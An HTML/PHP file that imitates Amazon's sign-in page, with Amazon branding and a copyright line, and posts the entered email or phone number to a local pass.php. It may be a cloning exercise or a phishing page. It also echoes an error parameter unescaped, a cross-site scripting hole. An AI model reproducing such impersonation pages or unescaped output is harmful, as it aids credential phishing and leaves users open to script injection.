<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="./images/logo-favicon.png">
	<title>Đăng nhập | Amazon</title>
	<link rel="stylesheet" href="../css/login.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</head>
<body>
<div class="container">
 <img src="../images//Screenshot 2022-01-07 203005.png" alt="">
	<form action="./pass.php" method="post">
     	  <div class="row">
		  <div class="text-signin">
		  <h2>Sign-In</h2>
		  </div>
     	<?php if (isset($_GET['error'])) { ?>
     		<p class="error"><?php echo $_GET['error']; ?></p>
     	<?php } ?>
        <label for="">Email or mobile phone number</label>
     	<input type="text" name="email">
     	<button type="submit">Continue</button>
          <div class="text-info">
		  <p>By continuing, you agree to Amazon's <a href="">Conditions of Use</a> and <a href="">Privacy Notice</a>.</p>
		  <div class="text-help">
		       <i class="fas fa-caret-right"></i> <a href="">Need help?</a>
		  </div>
		  </div>
		   </div>
     </form>
	 
	 <h6>New to Amazon?</h6>
	  <button class="btn btn-secondary">Create your Amazon account</button>
 </div>

<footer>
	<div class="footer">
		<div class="text-footer">
			<div class="text-footer-info">
				<a href="">Conditions of Use</a>
				<a href="">Privacy Notice</a>
				<a href="">Help</a>
			</div>
			<h9>© 1996-2021, Amazon.com, Inc. or its affiliates</h9>
		</div>
	</div>
</footer>




 <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
</body>
</html>